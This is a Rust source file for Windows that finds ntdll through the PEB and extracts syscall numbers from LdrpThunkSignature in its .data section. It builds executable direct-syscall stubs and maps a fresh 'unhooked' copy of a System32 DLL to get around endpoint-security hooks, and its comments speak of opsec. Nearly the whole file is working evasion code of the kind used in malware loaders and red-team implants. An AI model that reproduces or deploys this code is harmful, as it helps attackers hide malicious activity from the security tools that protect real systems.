use std::{
    str,
    ptr::{null_mut, copy_nonoverlapping},
    ffi::CStr, collections::BTreeMap,
};

use bstr::ByteSlice;

use std::mem::{zeroed, transmute};

use winapi::{
    um::{
        processthreadsapi::{GetCurrentProcess},
        handleapi::{CloseHandle},
        winnt::{IMAGE_DOS_SIGNATURE, PIMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE, PIMAGE_NT_HEADERS, 
            PIMAGE_SECTION_HEADER, MEM_RESERVE, MEM_COMMIT, ACCESS_MASK, 
            FILE_READ_DATA, FILE_SHARE_READ, SECTION_ALL_ACCESS, PAGE_READONLY, IMAGE_EXPORT_DIRECTORY, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, PAGE_EXECUTE_READ, PAGE_READWRITE, SEC_IMAGE},
        memoryapi::{VirtualAlloc, VirtualProtect},
    },
    shared::{
        ntdef::{NT_SUCCESS, HANDLE, PVOID, UNICODE_STRING, InitializeObjectAttributes, OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, NTSTATUS, PHANDLE, PLARGE_INTEGER, OBJ_CASE_INSENSITIVE},
        minwindef::{ULONG}, basetsd::{ULONG_PTR, SIZE_T, PSIZE_T},
    },
    ctypes::{c_void},
};

use ntapi::{
    ntpsapi::{PPEB_LDR_DATA},
    ntpebteb::{PPEB},
    ntldr::{PLDR_DATA_TABLE_ENTRY},
    ntrtl::RtlInitUnicodeString, ntioapi::{IO_STATUS_BLOCK, PIO_STATUS_BLOCK}, ntmmapi::{SECTION_INHERIT, ViewShare},
};


type NtOpenFile = unsafe extern "system" fn(
    FileHandle: PHANDLE, 
    DesiredAccess: ACCESS_MASK, 
    ObjectAttributes: POBJECT_ATTRIBUTES, 
    IoStatusBlock: PIO_STATUS_BLOCK, 
    ShareAccess: ULONG, 
    OpenOptions: ULONG
) -> NTSTATUS;

type NtCreateSection = unsafe extern "system" fn(
    SectionHandle: PHANDLE, 
    DesiredAccess: ACCESS_MASK, 
    ObjectAttributes: POBJECT_ATTRIBUTES, 
    MaximumSize: PLARGE_INTEGER, 
    SectionPageProtection: ULONG, 
    AllocationAttributes: ULONG, 
    FileHandle: HANDLE
) -> NTSTATUS;

type NtMapViewOfSection = unsafe extern "system" fn(
    SectionHandle: HANDLE, 
    ProcessHandle: HANDLE, 
    BaseAddress: *mut PVOID, 
    ZeroBits: ULONG_PTR, 
    CommitSize: SIZE_T, 
    SectionOffset: PLARGE_INTEGER, 
    ViewSize: PSIZE_T, 
    InheritDisposition: SECTION_INHERIT, 
    AllocationType: ULONG, 
    Win32Protect: ULONG
) -> NTSTATUS;

//For VirtualAlloc
const MAX_SYSCALL_STUB_SIZE: u32 = 64;
const PEBOFFSET: u64 = 0x60;

/* 
/// Gets the Process Environment Block Address (PEB)
unsafe fn get_peb_address() -> PPEB {
    let mut basic_information: PROCESS_BASIC_INFORMATION = zeroed();
    
    let process_handle: HANDLE = GetCurrentProcess();
    let status = NtQueryInformationProcess(process_handle, 0, 
        &mut basic_information as *mut _ as *mut c_void, 
        size_of::<PROCESS_BASIC_INFORMATION>() as u32, null_mut());   
        
    if !NT_SUCCESS(status) {
        CloseHandle(process_handle);
        panic!("[-] NtQueryInformationProcess: failed to retrieves information about the specified process");
    }

    return basic_information.PebBaseAddress;
}
*/

// credits: felix-rs
/// Gets the Process Environment Block Address (PEB)
#[inline(always)]
pub fn __readgsqword(offset: u64) -> u64 {
    let out: u64;

    unsafe {
        std::arch::asm!("mov {}, gs:[{}]",
        out(reg) out, in(reg) offset
        );
    }

    out
}

/// Retrieves the specified module from the local process
unsafe fn get_module_by_name(module_name: &str) -> PVOID  {
    //let peb_ptr: PPEB = get_peb_address();
    let peb_ptr = __readgsqword(PEBOFFSET) as PPEB;
    
    let mut dll_base = null_mut();
    
    let ptr_peb_ldr_data = transmute::<*mut _, PPEB_LDR_DATA>((*peb_ptr).Ldr);
    let mut module_list = transmute::<*mut _, PLDR_DATA_TABLE_ENTRY>((*ptr_peb_ldr_data).InLoadOrderModuleList.Flink);

    while !(*module_list).DllBase.is_null() {
        
        let slice = core::slice::from_raw_parts((*module_list).BaseDllName.Buffer, (*module_list).BaseDllName.Length as usize / 2);
        let dll_name = String::from_utf16(slice).unwrap();
        
        if dll_name.to_uppercase() == module_name.to_uppercase() {
            dll_base = (*module_list).DllBase;
            break;
        }
        module_list = transmute::<*mut _, PLDR_DATA_TABLE_ENTRY>((*module_list).InLoadOrderLinks.Flink);
    }

    return dll_base;
}

/// Retrieves the NT headers of the specified module
unsafe fn get_nt_headers(module_base: PVOID) -> PIMAGE_NT_HEADERS {
    let dos_header = transmute::<*mut _, PIMAGE_DOS_HEADER>(module_base);

    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return null_mut();
    }

    let nt_headers = transmute::<usize, PIMAGE_NT_HEADERS>(module_base as usize + (*dos_header).e_lfanew as usize);

    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return null_mut();
    }

    nt_headers
}

/// Retrieves the specified section of the specified module base address
unsafe fn get_sections_header(module_base: PVOID, nt_headers: PIMAGE_NT_HEADERS, section_type: &[u8]) -> (*const u32, &u32) {
    
    let nt_headers = &*nt_headers;

    let section_header = ((&nt_headers.OptionalHeader as *const _ as usize) 
        + (nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as PIMAGE_SECTION_HEADER;

    let mut data_section_address = 0 as *const u32;
    let mut data_section_size = &0;

    for i in 0..(*nt_headers).FileHeader.NumberOfSections {
        let section_header_i = &*(section_header.add(i as usize));

        let null_byte = section_header_i.Name.iter().position(|c| *c == b'\0').unwrap_or(section_header_i.Name.len());
        let section_name = &section_header_i.Name[..null_byte];
        
        if section_name == section_type {
            data_section_address = (module_base as usize + section_header_i.VirtualAddress as usize) as *const u32;
            data_section_size = section_header_i.Misc.VirtualSize();
            break;
        }
    }

    return (data_section_address, data_section_size);
}

/// Retrieves syscalls from LdrpThunkSignature in the .data section
unsafe fn get_syscalls_from_ldrp_thunk_signature(data_section_address: *const u32, data_section_size: &u32) -> Vec<*mut c_void> {
    let mut syscall_ntopenfile: u32 = 0;
    let mut syscall_ntcreatesection: u32 = 0;
    let mut syscall_ntmapviewofsection: u32 = 0;

    if (*data_section_address) == 0 || data_section_size < &(16 * 5) {
        panic!("[-] .data section base address is null or .data section size is less than 80");
    }

    let section_size = (data_section_size - &(16 * 5)) as isize;
    
    for offset in 0..section_size {

        // Have to divide by 4 because using .offset on a pointer is indexing an array 4 bytes at a time.
        if data_section_address.offset(offset).read() == 0xb8d18b4c 
        && data_section_address.offset(offset + (16 / 4)).read() == 0xb8d18b4c 
        && data_section_address.offset(offset + (32 / 4)).read() == 0xb8d18b4c 
        && data_section_address.offset(offset + (48 / 4)).read() == 0xb8d18b4c
        && data_section_address.offset(offset + (64 / 4)).read() == 0xb8d18b4c
        {
            syscall_ntopenfile = data_section_address.offset(offset + (4 / 4)).read() as u32;
            syscall_ntcreatesection = data_section_address.offset(offset + (16 + 4) / 4).read() as u32;
            syscall_ntmapviewofsection = data_section_address.offset(offset + (64 + 4) / 4).read() as u32;
            println!("\n[+] Found NtOpenFile Syscall Number: {:#x}", syscall_ntopenfile);
            println!("[+] Found NtCreateSection Syscall Number: {:#x}", syscall_ntcreatesection);
            println!("[+] Found NtMapViewOfSection Syscall Number: {:#x}", syscall_ntmapviewofsection);
            break;
        }
    }
    
    if syscall_ntopenfile == 0 && syscall_ntcreatesection == 0 && syscall_ntmapviewofsection == 0 {
        panic!("[-] Failed to find system calls for NtOpenFile, NtCreateSection or NtMapViewOfSection");
    }
    
    let nt_open_file = build_syscall_stub(syscall_ntopenfile);
    let nt_create_section = build_syscall_stub(syscall_ntcreatesection);
    let nt_map_view_of_section = build_syscall_stub(syscall_ntmapviewofsection);

    let system_calls = vec![nt_open_file, nt_create_section, nt_map_view_of_section];
    
    return system_calls;
}

/// Builds system calls for the specfied syscall number in the specfied region of memory
pub fn build_syscall_stub(syscall_number: u32) -> *mut c_void {
    
    //Not optimal from an opsec perspective
    let stub_region = unsafe { VirtualAlloc(null_mut(), MAX_SYSCALL_STUB_SIZE as usize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE) };

    if stub_region.is_null() {
        panic!("[-] Failed to allocate memory using VirtualAlloc");
    }

    let mut syscall_stub: Vec<u8> = vec![
        0x4c, 0x8b, 0xd1,               // mov r10, rcx
        0xb8, 0x00, 0x00, 0x00, 0x00,   // mov eax, xxx
        0x0f, 0x05,                     // syscall
        0xc3                            // ret
        ];

    syscall_stub[4] = syscall_number as u8;

    // Copy the syscall stub to allocated memory region
    unsafe { copy_nonoverlapping(syscall_stub.as_ptr(), stub_region as _, syscall_stub.len()) };

    let mut old_protection = unsafe { std::mem::zeroed() };

    // Make new buffer as executable
    let rv = unsafe { VirtualProtect(stub_region, syscall_stub.len(), PAGE_EXECUTE_READ, &mut old_protection) };

    if rv == 0 {
        panic!("[-] Failed to call VirtualProtect");
    }

    return stub_region;
}


/// Loads a unhooked fresh copy of a DLL into the current process
unsafe fn load_dll_into_section(syscalls: Vec<*mut c_void>, dll_path: &str) -> *mut c_void {
    let mut file_name: UNICODE_STRING = zeroed::<UNICODE_STRING>();

    let mut unicode_dll_path: Vec<_> =  dll_path.encode_utf16().collect();
    unicode_dll_path.push(0x0);
    RtlInitUnicodeString(&mut file_name, unicode_dll_path.as_ptr());

    let mut object_attributes: OBJECT_ATTRIBUTES = zeroed::<OBJECT_ATTRIBUTES>();

    InitializeObjectAttributes(&mut object_attributes, &mut file_name, OBJ_CASE_INSENSITIVE, null_mut(), null_mut());

    let ptr_nt_open_file = syscalls[0] as usize;
    let ptr_nt_create_section = syscalls[1] as usize;
    let ptr_nt_map_view_of_section = syscalls[2] as usize;

    let syscall_nt_open_file = transmute::<_, NtOpenFile>(ptr_nt_open_file);
    let syscall_nt_create_section = transmute::<_, NtCreateSection>(ptr_nt_create_section);
    let nt_map_view_of_section = transmute::<_, NtMapViewOfSection>(ptr_nt_map_view_of_section);

    let mut file_handle: HANDLE = null_mut();
    let mut io_status_block: IO_STATUS_BLOCK = zeroed();

    let mut section_handle = null_mut();
    let mut lp_section: *mut c_void = null_mut();
    let mut view_size: usize = 0;
    
    let status = syscall_nt_open_file(&mut file_handle, FILE_READ_DATA, &mut object_attributes, &mut io_status_block, FILE_SHARE_READ, 0);

    if !NT_SUCCESS(status) {
        close_handles(section_handle, file_handle, lp_section);
        panic!("[-] Failed to call NtOpenFile: {:?}", status);
    }

    let status = syscall_nt_create_section(&mut section_handle, SECTION_ALL_ACCESS, null_mut(), null_mut(), PAGE_READONLY, SEC_IMAGE, file_handle);

    if !NT_SUCCESS(status) {
        close_handles(section_handle, file_handle, lp_section);
        panic!("[-] Failed to call NtCreateSection: {:?}", status);
    }
    
    let status = nt_map_view_of_section(section_handle, GetCurrentProcess(), &mut lp_section as *mut _ as *mut _, 0, 0, null_mut(), &mut view_size, ViewShare, 0, PAGE_EXECUTE_READ);
    
    if !NT_SUCCESS(status) {
        close_handles(section_handle, file_handle, lp_section);
        panic!("[-] Failed to call NtMapViewOfSection: {:?}", status);
    }

    close_handles(section_handle, file_handle, lp_section);

    return lp_section;
}

/// Closes created handled
unsafe fn close_handles(section_handle: HANDLE, file_handle: HANDLE, lp_section: *mut c_void) {
    CloseHandle(section_handle);
    CloseHandle(file_handle);
    CloseHandle(lp_section);
}

/// Gets user input from the terminal
/*
fn get_input() -> io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

/// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
*/

/// Retrieves all function and addresses from the specfied modules
unsafe fn get_module_exports(module_base: *mut c_void) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();
    let dos_header = *(module_base as *mut IMAGE_DOS_HEADER);

    let nt_header =
        (module_base as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (module_base as usize
        + (*nt_header).OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize)
        as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize)
            as *const u32,
        (*export_directory).NumberOfNames as _,
    );
    
    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize)
            as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );
    
    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize)
            as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    //log::info!("[+] Module Base: {:?} Export Directory: {:?} AddressOfNames: {names:p}, AddressOfFunctions: {functions:p}, AddressOfNameOrdinals: {ordinals:p} ", module_base, export_directory);

    for i in 0..(*export_directory).NumberOfNames {
        
        let name = (module_base as usize + names[i as usize] as usize) as *const i8;

        if let Ok(name) = CStr::from_ptr(name).to_str() {
            
            let ordinal = ordinals[i as usize] as usize;

            exports.insert(
                name.to_string(),
                module_base as usize + functions[ordinal] as usize,
            );
        }
    }  
    return exports;
}

/*
/// Retrieves all function and addresses from the specfied modules
unsafe fn get_module_exports(module_base: *mut c_void) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();
    let dos_header = *(module_base as *mut IMAGE_DOS_HEADER);

    if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
        panic!("[-] Error: get_module_exports failed, DOS header is invalid");
    }
    
    let nt_header = (module_base as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
        panic!("[-] Error: get_module_exports failed, NT header is invalid");
    }

    let export_directory = rva_to_file_offset_pointer(module_base as usize, 
        (*nt_header).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress as u32) as *mut IMAGE_EXPORT_DIRECTORY;
    
    let names = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNames) as *const u32,
        (*export_directory).NumberOfNames as _,
    );
    
    let functions = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfFunctions) as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );
    
    let ordinals = core::slice::from_raw_parts(
        rva_to_file_offset_pointer(module_base as usize, (*export_directory).AddressOfNameOrdinals) as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    println!("[+] Module Base: {:?} Export Directory: {:?} AddressOfNames: {names:p}, AddressOfFunctions: {functions:p}, AddressOfNameOrdinals: {ordinals:p} ", module_base, export_directory);
    println!("Number of Names: {:?}", (*export_directory).NumberOfNames);

    for i in 0..(*export_directory).NumberOfNames {

        let name = rva_to_file_offset_pointer(module_base as usize, names[i as usize]) as *const i8;

        if let Ok(name) = CStr::from_ptr(name).to_str() {
            
            let ordinal = ordinals[i as usize] as usize;

            exports.insert(
                name.to_string(), 
                rva_to_file_offset_pointer(module_base as usize, functions[ordinal])
            );
        }
    }  
    exports
}
*/

/* 
unsafe fn rva_to_file_offset_pointer(module_base: usize, mut rva: u32) -> usize {
    let dos_header = module_base as PIMAGE_DOS_HEADER;

    let nt_headers = (module_base as usize + (*dos_header).e_lfanew as usize) as PIMAGE_NT_HEADERS;

    let ref_nt_headers = &*nt_headers;

    let section_header = ((&ref_nt_headers.OptionalHeader as *const _ as usize) 
        + (ref_nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as PIMAGE_SECTION_HEADER;

    let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
    
    for i in 0..number_of_sections as usize {

        let virt_address = (*section_header.add(i)).VirtualAddress;
        let virt_size = (*section_header.add(i)).Misc.VirtualSize();
        
        if virt_address <= rva && virt_address + virt_size > rva {

            rva -= (*section_header.add(i)).VirtualAddress;
            rva += (*section_header.add(i)).PointerToRawData;
            
            return module_base + rva as usize;
        }
    }

    return 0;
}*/

/// Extracts the system call number from the specfied function pointer
fn find_bytes(function_ptr: usize) -> usize {    
    let stub: &'static [u8] = &[0x4c, 0x8b, 0xd1, 0xb8];

    let func_slice: &[u8] = unsafe { core::slice::from_raw_parts(function_ptr as *const u8, 5) };

    let syscall: Option<u8> = func_slice.find(stub).map(|idx| func_slice[idx + stub.len()]);

    match syscall {
        Some(syscall_number) => return syscall_number as usize,
        None => println!("[-] System call number not found"),
    }

    return 0;
}

pub fn get_module_base_address(dll_name: &str) -> *mut c_void {

    let syscalls_memory_regions = get_3_magical_syscall_memory_region_for_loading_dll();
    
    // Load an unhooked fresh copy of a dll from disk using the system calls from LdrpThunkSignature
    let dll_path = "\\??\\C:\\Windows\\System32\\".to_owned();
    let dll = dll_path + dll_name;
    
    let ptr_dll = unsafe { load_dll_into_section(syscalls_memory_regions, dll.as_str()) };
    println!("[+] Pointer to the fresh copy of the specified DLL: {:?}", ptr_dll);

    return ptr_dll;
}

pub fn get_3_magical_syscall_memory_region_for_loading_dll() -> Vec<*mut c_void> {

    let section_type = b".data";

    // Get NTDLL's base address for the current process
    let ntdll_module_base = unsafe { get_module_by_name("ntdll.dll") };
    println!("[+] Module Base Address: {:?}", ntdll_module_base);

    // Get NT Headers for NTDLL
    let ntdll_nt_headers =  unsafe { get_nt_headers(ntdll_module_base) };
    println!("[+] NT Headers Base Address: {:?}", ntdll_nt_headers);

    // Get the .data section for NTDLL
    let (ntdll_section_base, ntdll_section_size) = unsafe { get_sections_header(ntdll_module_base, ntdll_nt_headers, section_type) };
    println!("[+] Section Header Base Address: {:?} Section Size: {:?}", ntdll_section_base as *mut c_void, ntdll_section_size);

    // Get the system calls for NtOpenFile, NtCreateSection, NtMapViewOfSection from LdrpThunkSignature from the .data section of NTDLL
    let syscalls_memory_regions = unsafe { get_syscalls_from_ldrp_thunk_signature(ntdll_section_base, ntdll_section_size) } ;
    println!("\n[+] System call stub memory region: {:?}\n", syscalls_memory_regions);
    
    return syscalls_memory_regions;
}

#[allow(dead_code)]
pub fn get_function_address_with_syscall_bytes(ptr_ntdll: *mut c_void, function_to_call: &str) -> usize {
    let mut function_ptr = 0;
    
    //Get the names and addresses of functions in NTDLL
    for (name, addr) in unsafe { get_module_exports(ptr_ntdll) } {
        if name == function_to_call {
            println!("[+] Function: {:?} Address {:#x}", name, addr);
            function_ptr = addr;
        }
    }

    // Get syscalls from the unhooked fresh copy of NTDLL
    let system_call_number = find_bytes(function_ptr);
    //println!("[+] Syscall Number: {:#x}", system_call_number);

    return system_call_number;
}

pub fn get_function_address(ptr_ntdll: *mut c_void, function_to_call: &str) -> usize {
    let mut function_ptr = 0;
    
    //Get the names and addresses of functions in NTDLL
    for (name, addr) in unsafe { get_module_exports(ptr_ntdll) } {
        if name == function_to_call {
            println!("name: {:?}", name);
            println!("[+] Function: {:?} Address {:#x}", name, addr);
            function_ptr = addr;
        }
    }


    return function_ptr;
}